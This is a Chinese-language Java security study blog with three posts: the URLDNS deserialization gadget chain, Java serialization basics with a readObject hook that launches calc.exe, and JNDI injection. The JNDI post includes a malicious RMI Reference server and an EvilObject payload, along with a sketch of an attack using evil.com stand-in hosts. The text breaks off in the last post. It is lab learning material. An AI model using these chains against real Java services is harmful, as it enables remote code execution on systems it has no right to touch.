        <content type="html"><![CDATA[<h1 id="URLDNS利用链"><a href="#URLDNS利用链" class="headerlink" title="URLDNS利用链"></a>URLDNS利用链</h1><p>URLDNS利用链是java原生的一条利用链，通常用来验证是否存在反序列化漏洞，因为是原生的，所以不存在版本限制</p><p>特点:</p><ul><li>不限制jdk版本，使用Java内置类，对第三方依赖没有要求</li><li>目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞</li><li>URLDNS利用链，只能发起DNS请求，并不能进行其他利用</li></ul><h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><p>HashMap 是一个存储键值对的容器。 每个键与一个值关联。 <code>HashMap</code>中的键必须唯一。 <code>HashMap</code>在其他编程语言中称为关联数组或词典。 <code>HashMaps</code>占用更多内存，因为每个值还有一个键。 删除和插入操作需要固定的时间。 <code>HashMaps</code>可以存储空值。</p><p>基本用法：</p><p>创建对象</p><pre><code class="java">HashMap&lt;String,Integer&gt; hashMap = new HashMap&lt;&gt;();</code></pre><p>添加键值对：</p><pre><code class="java">hashMap.put(&quot;aa&quot;,1);hashMap.put(&quot;bb&quot;,2);hashMap.put(&quot;cc&quot;,3);</code></pre><p>put方法会覆盖原有的value，而另一种put方法不会覆盖：putIfAbsent(key,value)</p><pre><code class="java">hashMap.putIfAbsent(&quot;aa&quot;,4);</code></pre><p>该方法首先会判断key是否存在，如果存在且value不为null，则不会覆盖原有的value，并返回原来的value；如果key不存在或者key的value为null，则会put进新值，并返回null。</p><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p><code>java.util.HashMap</code> 重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode.而 <code>java.net.URL</code> 的 hashCode 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求</p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p><strong>HashMap.readObject()–&gt;HashMap.putVal()–&gt;HashMap.hash()–&gt;URL.hashcode()–&gt;URLStreamHandler().hashCode().getHostAddress()–&gt;URLStreamHandler().hashCode().getHostAddress().getByName()</strong> </p><pre><code class="java">1. HashMap --&gt; readObject()2. HashMap --&gt; hash()3. URL --&gt; hashCode()4. URLStreamHandler --&gt; hashCode()5. URLStreamHandler --&gt; getHostAddress()6. InetAddress --&gt; getByName()</code></pre><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre><code class="java">import java.lang.reflect.Field;import java.util.HashMap;import java.net.URL;import java.io.*;public class Test &#123;    public static void main(String[] args) throws Exception &#123;    HashMap&lt;URL,Object&gt; hashMap=new HashMap&lt;&gt;();    URL url = new URL(&quot;http://7zswrn.dnslog.cn&quot;);    Field field= url.getClass().getDeclaredField(&quot;hashCode&quot;);    field.setAccessible(true);    field.set(url,123);    hashMap.put(url,1);    field.set(url,-1);    new ObjectOutputStream(new FileOutputStream(&quot;bin.ser&quot;)).writeObject(hashMap);    Object o = new ObjectInputStream(new FileInputStream(&quot;bin.ser&quot;)).readObject();    System.out.println(o);    &#125;&#125;</code></pre><p>运行时需要添加<code>--add-opens java.base/java.net=ALL-UNNAMED</code>  不然会报错</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021427567.png" alt="image-20230402142752339"></p><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>这个利用链的入口在HashMap里，它实现了Serializable接口，说明它支持序列化和反序列化</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021636523.png" alt="image-20230402143132873"></p><p>在HashMap类中，它重写了readObjec()方法，在反序列化的执行过程中，就会优先执行这里的readObjec()方法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021636208.png" alt="image-20230402143855396"></p><p>然后跟着链子往下,这是readObjec()最后一行代码，调用了<code>putVal()</code>方法，参数中使用了<code>hash(key)</code>，这个<code>key</code>就行我们传进去的url</p><p>,即<code>http://7zswrn.dnslog.cn</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021636604.png" alt="image-20230402144047378"></p><p>跟进<code>hash()</code>方法,发现里面调用的是Object.hashCode()方法，但是这不是我们想要的</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021636599.png" alt="image-20230402144603150"></p><p>需要调试获取我们想要的hashcode(),在<code>readObjec().putVal()</code>方法处下断点</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021637404.png" alt="image-20230402145209616"></p><p>步进，看到key就是我们传入的参数url</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021637991.png" alt="image-20230402145323587"></p><p>再步进，此时已经跳到了<code>URL</code>的hashCode()里面了，这里可以知道很清晰的代码逻辑，此时<code>hashCode==-1</code>,不会直接返回hashCode，而是执行<code>hashCode = handler.hashCode(this);</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021637711.png" alt="image-20230402150215474"></p><p>再步进，此时已经到了URLStreamHandler类，看到触发函数getHostAddress()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021637628.png" alt="image-20230402150338349"></p><p>继续步进，往下走，看到最终发起请求的方法<code>InetAddress.getByName()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021637276.png" alt="image-20230402152803865"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021638093.png" alt="image-20230402153437447"></p><p>PS:刚刚的地址失效了，重新获取了地址olliao.dnslog.cn</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021638558.png" alt="image-20230402154053223"></p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>先创建两个对象</p><pre><code class="java">HashMap&lt;URL,Object&gt; hashMap=new HashMap&lt;&gt;();URL url = new URL(&quot;http://olliao.dnslog.cn&quot;);//主角</code></pre><p>添加键值对,值随便写</p><pre><code class="java">hashMap.put(url,1);</code></pre><p>看看put源码，会发现，它put方法里调用的hash(),key就是传进来的url,然后就是上面那套逻辑了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021638472.png" alt="image-20230402155135951"></p><p>URL中hashCode初始值为-1,说明还没有被初始化，初始化后会进行hash运算，hashCode的值会变成运算出来的hash</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021638237.png" alt="image-20230402155719523"></p><p>此时会运行到这里执行hashCode(),然后就因为hashCode&#x3D;-1发起请求包，还没反序列化就执行了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304021638870.png" alt="image-20230402144603150"></p><p>所以要让它不发包，不能让hashCode&#x3D;-1,导致进行发包请求.</p><p>通过Java反射获取hashCode,把他修改</p><pre><code class="java">Field field= url.getClass().getDeclaredField(&quot;hashCode&quot;);</code></pre><p>因为hashCode是<code>private</code>私有属性，不能直接修改，所以打开对该字段的访问权限，让hashCode可以被操作</p><pre><code class="java">field.setAccessible(true);</code></pre><p>将 url 对象的 hashCode 字段的值设置为 123,只要不是<code>-1</code>就行</p><pre><code class="java">field.set(url,123);</code></pre><p>在后面，需要反序列化去操作它的时候，再把hashCode的值改回<code>-1</code>,这样才会去走那段发请求的代码</p><pre><code class="java">field.set(url,-1);</code></pre><p>然后就是序列化和反序列化操作了</p><pre><code class="java">new ObjectOutputStream(new FileOutputStream(&quot;bin.ser&quot;)).writeObject(hashMap);Object o = new ObjectInputStream(new FileInputStream(&quot;bin.ser&quot;)).readObject();System.out.println(o);//简单输出一下</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java序列化与反序列化</title>
      <link href="/2023/03/23/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/03/23/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Java序列化与反序列化"><a href="#Java序列化与反序列化" class="headerlink" title="Java序列化与反序列化"></a>Java序列化与反序列化</h1><h2 id="什么是序列化和反序列化"><a href="#什么是序列化和反序列化" class="headerlink" title="什么是序列化和反序列化"></a>什么是序列化和反序列化</h2><p>序列化: 把Java对象转换为字节序列的过程</p><p>反序列化：把字节序列恢复为Java对象的过程</p><h2 id="序列化和反序列化的意义"><a href="#序列化和反序列化的意义" class="headerlink" title="序列化和反序列化的意义"></a>序列化和反序列化的意义</h2><p>序列化与反序列化的设计就是用来传输数据的。</p><p>当两个进程进行通信的时候，可以通过序列化反序列化来进行传输。</p><p><strong>序列化的好处:</strong></p><ul><li><p>能够实现数据的持久化，通过序列化可以把数据永久的保存在硬盘上，也可以理解为通过序列化将数据保存在文件中。</p></li><li><p>利用序列化实现远程通信，在网络上传送对象的字节序列。</p></li></ul><p>**序列化与反序列化应用的场景: **</p><ul><li>想把内存中的对象保存到一个文件中或者是数据库当中。</li><li>用套接字在网络上传输对象。</li><li>通过 RMI 传输对象的时候。</li></ul><h2 id="常见的序列化和反序列化协议"><a href="#常见的序列化和反序列化协议" class="headerlink" title="常见的序列化和反序列化协议"></a>常见的序列化和反序列化协议</h2><ul><li>XML&amp;SOAP</li></ul><p>XML 是一种常用的序列化和反序列化协议，具有跨机器，跨语言等优点，SOAP（Simple Object Access protocol） 是一种被广泛应用的，基于 XML 为序列化和反序列化协议的结构化消息传递协议</p><ul><li>JSON</li><li>Protobuf</li></ul><h2 id="实现序列化和反序列化的方法"><a href="#实现序列化和反序列化的方法" class="headerlink" title="实现序列化和反序列化的方法"></a>实现序列化和反序列化的方法</h2><ul><li>java.io.ObjectOutputStream<br>序列化：首先给该类传入一个文件对象(用于写入序列化结果)，然后通过调用该类的 writeObject(目标对象) 方法将目标对象写入到文件</li><li>java.io.ObjectInputStream<br>反序列化：首先给该类传入一个文件对象(用于读取文件中的序列化结果)，然后通过调用该类的 readObject() 方法将其反序列化为目标对象</li></ul><h2 id="简单实现序列化"><a href="#简单实现序列化" class="headerlink" title="简单实现序列化"></a>简单实现序列化</h2><h3 id="Serializable"><a href="#Serializable" class="headerlink" title="Serializable"></a>Serializable</h3><p>将要序列化的类实现 <code>Serializabel</code> 接口（Serializable 接口是一个标记接口，不用实现任何方法。一旦实现了此接口，则表明该类的对象就是可序列化的），而且所有属性必须是可序列化的，就是如果一个可序列化的类的成员不是基本类型，也不是 String 类型，比如自己自定义的类，那这个引用类型也必须是可序列化的，否则，会导致此类不能序列化 (用 <code>transient</code> 关键字修饰的属性除外，不参与序列化过程) 。</p><p>例如：</p><p>实现一个Person类，其中<code>money</code>是被<code>transient</code>修饰的</p><pre><code class="java">import java.io.*;public class Person implements Serializable &#123;    public String name;    public int age;    public transient int money;    public Person(String name, int age,int money) &#123;        this.name = name;        this.age = age;        this.money = money;    &#125;&#125;</code></pre><p>实现序列化：序列化成功后会生成person.ser文件，里面存储的是person对象的所有属性和状态的字节序列</p><pre><code class="java">import java.io.*;public class SerializationExample &#123;    public static void main(String[] args) throws Exception &#123;        // 创建一个Person对象        Person person = new Person(&quot;T0dis&quot;, 18,100);                // 创建ObjectOutputStream对象                FileOutputStream fileOut = new FileOutputStream(&quot;person.ser&quot;);                ObjectOutputStream out = new ObjectOutputStream(fileOut);        // 序列化Java对象        out.writeObject(person);        // 关闭流        out.close();        fileOut.close();        System.out.println(&quot;反序列化成功&quot;);    &#125;&#125;</code></pre><p>实现反序列化： </p><pre><code class="java">import java.io.*;public class DeserializationExample &#123;    public static void main(String[] args) throws Exception &#123;        // 创建ObjectInputStream对象        FileInputStream fileIn = new FileInputStream(&quot;person.ser&quot;);                ObjectInputStream in = new ObjectInputStream(fileIn);        // 反序列化Java对象        Person person = (Person) in.readObject();        // 输出反序列化后的对象属性        System.out.println(person.name);        System.out.println(person.age);        System.out.println(person.money);        // 关闭流        in.close();        fileIn.close();//当io流不需要使用到时，一定要进行关闭流操作，否则很可能引起内存泄漏    &#125;&#125;</code></pre><p>反序列化的结果：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304011508055.png" alt="image-20230401150831703"></p><p>可以发现transient 修饰的 money没有被序列化，所以反序列化结果中没有值，如果是字符串，它的结果将是null</p><h3 id="Externalizable"><a href="#Externalizable" class="headerlink" title="Externalizable"></a>Externalizable</h3><p>Externalizable进行序列化和反序列化会比较麻烦，因为需要重写序列化和反序列化的方法，序列化的细节需要手动完成。当读取对象时，会调用被序列化类的无参构造器去创建一个新的对象，然后再将被保存对象的字段的值分别填充到新对象中。因此，实现Externalizable接口的类必须要提供一个无参的构造器，且它的访问权限为public。</p><p>创建了一个 <code>Person</code> 对象</p><pre><code class="java">import java.io.*;class Person implements Externalizable &#123;    private String name;    private int age;    public Person() &#123;&#125; // 构造函数需要提供无参构造方法    public Person(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;        //下面是重写方法，在下面的代码中，transient关键字就不起作用了    @Override    public void writeExternal(ObjectOutput out) throws IOException &#123;        out.writeObject(name); // 写入 name 属性        out.writeInt(age); // 写入 age 属性    &#125;    @Override    public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException &#123;        name = (String) in.readObject(); // 读取 name 属性        age = in.readInt(); // 读取 age 属性    &#125;&#125;</code></pre><p>序列化和反序列化的过程</p><pre><code class="java">public class Main &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;        Person person = new Person(&quot;Lucy&quot;, 18);        System.out.println(&quot;Before serialization: &quot; + person);        // 序列化        ByteArrayOutputStream baos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(baos);        oos.writeObject(person);        // 反序列化        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());        ObjectInputStream ois = new ObjectInputStream(bais);        Person newPerson = (Person) ois.readObject();        System.out.println(&quot;After deserialization: &quot; + newPerson);    &#125;&#125;</code></pre><h2 id="反序列化后命令执行"><a href="#反序列化后命令执行" class="headerlink" title="反序列化后命令执行"></a>反序列化后命令执行</h2><pre><code class="java">import java.io.*;class RUN_C implements java.io.Serializable&#123;    public String name;    public String motto;    // 自定义 readObject 方法    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException&#123;        //执行默认的readObject()方法        in.defaultReadObject();        //执行命令        Runtime.getRuntime().exec(&quot;calc.exe&quot;);    &#125;&#125;public class SerializeTest &#123;    public static void main(String [] args) throws IOException, ClassNotFoundException&#123;        //实例化一个可序列化对象        RUN_C testClass = new RUN_C();        testClass.name = &quot;Haker by xxxxxx&quot;;        testClass.motto = &quot;Haker!&quot;;        //序列化        //将序列化后的对象写入到文件        FileOutputStream fos = new FileOutputStream(&quot;test.ser&quot;);        ObjectOutputStream os = new ObjectOutputStream(fos);        os.writeObject(testClass);        os.close();        fos.close();        //反序列化        RUN_C obj = null;        //从文件读取序列化的结果后进行反序列化        FileInputStream fis = new FileInputStream(&quot;test.ser&quot;);        ObjectInputStream ois = new ObjectInputStream(fis);        obj = (RUN_C)ois.readObject();        ois.close();        fis.close();        System.out.println(obj.name);        //System.out.println(obj.motto);    &#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304012026631.png" alt="image-20230401202615699"></p><p>使用WinHex查看序列化生成的test.ser文件：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304012029028.png" alt="image-20230401202927501"></p><ul><li>AC ED：Java序列化文件的魔数。</li><li>00 05：版本号，其中00 05表示主版本号为0，次版本号为5。</li><li>73 72：常量流（常量池）的标识符，代表下面的字节流是常量池信息。</li><li>00 05：常量池信息的长度，即5个字节。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JNDI注入学习</title>
      <link href="/2023/03/19/JNDI%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/03/19/JNDI%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="JNDI注入学习"><a href="#JNDI注入学习" class="headerlink" title="JNDI注入学习"></a>JNDI注入学习</h1><h2 id="理解JNDI"><a href="#理解JNDI" class="headerlink" title="理解JNDI"></a>理解JNDI</h2><p>JNDI是Java命名和目录接口，是Java的一个目录服务应用程序接口，它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。——–维基百科</p><p>很官方，看不懂 建议看这篇文章理解    <a href="https://blog.csdn.net/wn084/article/details/80729230">https://blog.csdn.net/wn084/article/details/80729230</a></p><p>通俗易懂的解释就是就是把资源取个名字，再根据名字来找资源,就像人的身份证或DNS中的域名与IP的关系</p><p>另一种理解：JNDI就是一组API接口。每一个对象都有一组唯一的键值绑定，将名字和对象绑定，可以通过名字检索指定的对象，而该对象可能存储在RMI、LDAP、CORBA等等。</p><p>JNDI支持的服务主要有：<code>DNS</code>、<code>LDAP</code>、<code>CORBA</code>、<code>RMI</code>等</p><h4 id="Java-Naming"><a href="#Java-Naming" class="headerlink" title="Java Naming"></a>Java Naming</h4><p>命名服务是一种键值对的绑定，使应用程序可以通过键检索值。</p><h4 id="Java-Directory"><a href="#Java-Directory" class="headerlink" title="Java Directory"></a>Java Directory</h4><p>目录服务是命名服务的自然扩展。这两者之间的区别在于目录服务中对象可以有属性，而命名服务中对象没有属性。因此，在目录服务中可以根据属性搜索对象。</p><p>JNDI允许你访问文件系统中的文件，定位远程RMI注册的对象，访问如LDAP这样的目录服务，定位网络上的EJB组件。</p><h4 id="ObjectFactory"><a href="#ObjectFactory" class="headerlink" title="ObjectFactory"></a>ObjectFactory</h4><p>Object Factory用于将Naming Service（如RMI&#x2F;LDAP）中存储的数据转换为Java中可表达的数据，如Java中的对象或Java中的基本数据类型。每一个Service Provider可能配有多个Object Factory。</p><p>JNDI注入的问题就是处在可远程下载自定义的ObjectFactory类上。</p><h2 id="JNDI代码示例"><a href="#JNDI代码示例" class="headerlink" title="JNDI代码示例"></a>JNDI代码示例</h2><p>先写个用于测试的<code>Person</code>类</p><pre><code class="java">import java.io.Serializable;import java.rmi.Remote;public class Person implements Remote, Serializable &#123;    private static final long serialVersionUID = 1L;    private String name;    private String password;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public String getPassword() &#123;        return password;    &#125;    public void setPassword(String password) &#123;        this.password = password;    &#125;    public String toString()&#123;        return &quot;name:&quot;+name+&quot; password:&quot;+password;    &#125;&#125;</code></pre><p>这段代码实现了两个接口：Remote和Serializable。其中，Remote是Java远程方法调用（RMI）机制中的标记接口，用于表明该类的实例可以被远程访问；Serializable则是Java序列化机制中的标记接口，用于表明该类的实例可以被序列化成字节流并传输。</p><p>除了这两个接口之外，Person类还有两个私有属性：name和password，分别表示人名和密码。它们都提供了对应的getter和setter方法，用于获取和设置属性值。此外，还定义了一个toString()方法，用于将Person对象转换成字符串形式返回。</p><p>下面是服务端：</p><pre><code>import javax.naming.Context;import javax.naming.InitialContext;import java.rmi.registry.LocateRegistry;public class Server &#123;    public static void initPerson() throws Exception &#123;        //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常        LocateRegistry.createRegistry(6666);        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);        System.setProperty(Context.PROVIDER_URL, &quot;rmi://localhost:6666&quot;);        //初始化        InitialContext ctx = new InitialContext();        //实例化person对象        Person p = new Person();        p.setName(&quot;T0dis&quot;);        p.setPassword(&quot;helloworld!&quot;);        //person对象绑定到JNDI服务中，JNDI的名字叫做：person。        ctx.bind(&quot;person&quot;, p);        ctx.close();    &#125;    public static void main(String[] args) throws Exception &#123;        initPerson();        System.out.println(&quot;Server is running and waiting for client to connect...&quot;);        //加入阻塞代码，使Server一直运行        Object lock = new Object();        synchronized (lock) &#123;            lock.wait();        &#125;    &#125;&#125;</code></pre><p>服务端的代码使用Java RMI实现了JNDI服务。实现过程如下：</p><ol><li>在initPerson()方法中，首先使用 <code>LocateRegistry.createRegistry</code> 方法创建了一个 RMI Registry 对象。这个对象被绑定到本地6666端口。RMI Registry 是一个注册表，它维护了所有注册到它的对象。在这个例子中，Person对象将被绑定到RMI Registry中。</li><li>然后设置了JNDI的工厂和JNDI的url和端口参数。这些参数在创建InitialContext对象时会使用到。如果未设置这些参数，则无法连接到JNDI服务并将导致 NoInitialContextException 异常。</li><li>创建 InitialContext 对象。这个对象将用作与JNDI服务通讯的主要入口。可以使用 <code>ctx.bind</code> 方法来将一个Person对象绑定到 JNDI服务中，这个对象的名字被指定为 “person”。</li><li>创建了一个Person对象，并设置了它的属性（即名称和密码）。</li><li>将Person对象绑定到JNDI服务中，以便客户端可以查询和使用它。</li></ol><p>下面的是客户端的代码：</p><pre><code>import javax.naming.Context;import javax.naming.InitialContext;public class Client &#123;    public static void main(String[] args)throws Exception &#123;        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);        System.setProperty(Context.PROVIDER_URL, &quot;rmi://localhost:6666&quot;);        InitialContext ctx = new InitialContext();        //通过lookup查找person对象        Person person = (Person) ctx.lookup(&quot;person&quot;);        //打印出这个对象        System.out.println(person.toString());        ctx.close();    &#125;&#125;</code></pre><ol><li>通过使用System.setProperty()方法，设置 JNDI 的工厂和目标端口，以便获取RMI对象。</li><li>使用 InitialContext 类创建一个新的 JNDI 上下文并将其赋值给 ctx 对象。</li><li>查找在服务端已经在RMI注册表上注册了的“person”对象，并将其赋值给person对象。</li><li>输出 person 对象的 toString 方法的返回值。</li><li>关闭ctx，释放与JNDI上下文的所有资源</li></ol><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>要想成功利用JNDI注入漏洞，重要的前提就是当前Java环境的JDK版本，而JNDI注入中不同的攻击向量和利用方式所被限制的版本号都有点不一样。</p><ul><li>JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li><li>JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li><li>JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</li></ul><p>在上面的代码示例中客户端 <code>Person person = (Person) ctx.lookup(&quot;person&quot;);</code>，如果<code>lookup</code>函数的参数可控,就有可能会造成<code>JNDI注入</code></p><p>官方一点的解释：JNDI 注入<strong>就是控制 lookup 函数的参数，这样来使客户端访问恶意的 RMI 或者 LDAP 服务来加载恶意的对象，从而执行代码</strong>，完成利用在 JNDI 服务中，通过绑定一个外部远程对象让客户端请求，从而使客户端恶意代码执行的方式就是利用 Reference 类实现的</p><p>大概过程：</p><p><img src="https://miro.medium.com/v2/resize:fit:560/1*JH6AblHnH7grDeyGMRHKZg.png" alt="img"></p><p>① 攻击者为易受攻击的JNDI的lookup方法提供了LDAP&#x2F;RMI URL</p><p>② 目标服务器连接到远端LDAP&#x2F;RMI服务器，LDAP&#x2F;RMI服务器返回恶意JNDI引用</p><p>③ 目标服务器解码JNDI引用</p><p>④ 从远端LDAP&#x2F;RMI服务器获取Factory类</p><p>⑤ 目标服务器实例化Factory类</p><p>⑥ payload得到执行。</p><h2 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h2><p>该类也是在<code>javax.naming</code>的一个类，该类表示对在命名&#x2F;目录系统外部找到的对象的引用。提供了JNDI中类的引用功能。</p><p>构造方法</p><pre><code class="java">Reference(String className)     为类名为“className”的对象构造一个新的引用。  Reference(String className, RefAddr addr)     为类名为“className”的对象和地址构造一个新引用。  Reference(String className, RefAddr addr, String factory, String factoryLocation)     为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。  Reference(String className, String factory, String factoryLocation)     为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </code></pre><pre><code>String url = &quot;http://127.0.0.1:8080&quot;;Reference reference = new Reference(&quot;test&quot;, &quot;test&quot;, url);</code></pre><p>参数1：<code>className</code> - 远程加载时所使用的类名</p><p>参数2：<code>classFactory</code> - 加载的<code>class</code>中需要实例化类的名称</p><p>参数3：<code>classFactoryLocation</code> - 提供<code>classes</code>数据的地址可以是<code>file/ftp/http</code>协议</p><h2 id="JNDI-RMI的攻击面"><a href="#JNDI-RMI的攻击面" class="headerlink" title="JNDI_RMI的攻击面"></a>JNDI_RMI的攻击面</h2><h4 id="RMI-Reference利用"><a href="#RMI-Reference利用" class="headerlink" title="RMI+Reference利用"></a>RMI+Reference利用</h4><p>Reference类：</p><p>Reference类表示对存在于命名&#x2F;目录系统以外的对象的引用。</p><p>Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。</p><p>在使用Reference时，我们可以直接将对象写在构造方法中，当被调用时，对象的方法就会被触发。</p><p>几个比较关键的属性：</p><ul><li>className：远程加载时所使用的类名；</li><li>classFactory：加载的class中需要实例化类的名称；</li><li>classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file&#x2F;ftp&#x2F;http等协议</li></ul><p><strong>这个类中包含被引用对象的类信息和地址</strong>。</p><p>因为在JNDI中，对象传递要么是序列化方式存储（对象的拷贝，对应按值传递），要么是按照引用（对象的引用，对应按引用传递）来存储，当序列化不好用的时候，我们可以使用Reference将对象存储在JNDI系统中。so，利用思路如下：</p><p><strong>将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行</strong></p><p><img src="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/6.png" alt="img"></p><ol><li>攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 <code>rmi://evil.com:1099/refObj</code>；</li><li>原先配置好的上下文环境 <code>rmi://localhost:1099</code> 会因为动态环境转换而被指向 <code>rmi://evil.com:1099/</code>；</li><li>应用去 <code>rmi://evil.com:1099</code> 请求绑定对象 <code>refObj</code>，攻击者事先准备好的 RMI 服务会返回与名称 <code>refObj</code>想绑定的 ReferenceWrapper 对象（<code>Reference(&quot;EvilObject&quot;, &quot;EvilObject&quot;, &quot;http://evil-cb.com/&quot;)</code>）；</li><li>应用获取到 <code>ReferenceWrapper</code> 对象开始从本地 <code>CLASSPATH</code> 中搜索 <code>EvilObject</code> 类，如果不存在则会从 <code>http://evil-cb.com/</code> 上去尝试获取 <code>EvilObject.class</code>，即动态的去获取 <code>http://evil-cb.com/EvilObject.class</code>；</li><li>攻击者事先准备好的服务返回编译好的包含恶意代码的 <code>EvilObject.class</code>；</li><li>应用开始调用 <code>EvilObject</code> 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行；</li></ol><p> <strong>PS</strong>: JNDI协议动态转换即在运行时动态地切换JNDI提供者的类型或实现。这种转换可以在应用程序的代码中发生，例如在代码中更改JNDI上下文的URL以使用不同的服务提供者。这样可以在不修改应用程序代码的情况下实现切换和更改JNDI提供者。类比于换手机卡，不同的卡可以提供不同的服务，可以根据需要更换卡来达到切换服务的目的</p><p>我的JDK版本是jdk1.8.0_361 </p><p>客户端代码：</p><pre><code class="java">import javax.naming.Context;import javax.naming.InitialContext;public class Client &#123;    public static void main(String[] args)throws Exception &#123;        System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);//允许RMI协议进行远程调，可能是JDK版本的问题,没有这个会报错        String uri = &quot;rmi://127.0.0.1:1099/refObj&quot;;        Context ctx = new InitialContext();        System.out.println(&quot;Using lookup() to fetch object with &quot; + uri);        ctx.lookup(uri);    &#125;&#125;</code></pre><p>服务端：</p><pre><code class="java">import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import javax.naming.Reference;import com.sun.jndi.rmi.registry.ReferenceWrapper;public class Server &#123;    public static void main(String args[]) throws Exception &#123;        Registry registry = LocateRegistry.createRegistry(1099);        Reference refObj = new Reference(&quot;EvilObject&quot;, &quot;EvilObject&quot;, &quot;http://127.0.0.1:8080/&quot;);        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);        System.out.println(&quot;Binding &#39;refObjWrapper&#39; to &#39;rmi://127.0.0.1:1099/refObj&#39;&quot;);        registry.bind(&quot;refObj&quot;, refObjWrapper);    &#125;&#125;</code></pre><p>恶意类(弹计算机)：</p><pre><code class="java">public class EvilObject &#123;    public EvilObject() throws Exception &#123;        Runtime rt = Runtime.getRuntime();        String[] commands = &#123;&quot;cmd&quot;, &quot;/C&quot;, &quot;calc.exe&quot;&#125;;        Process pc = rt.exec(commands);        pc.waitFor();    &#125;&#125;</code></pre><p>为了防止漏洞复现过程中应用端实例化EvilObject对象时从CLASSPATH当前路径找到编译好的字节代码，而不去远端进行下载的情况发生，将Server和Client放在同一个文件夹，EvilObject放在另外的文件夹</p><p>在复现过程中，发现EvilObject并没有被远程加载，只能加载当前路径编译好的字节代码</p><p><img 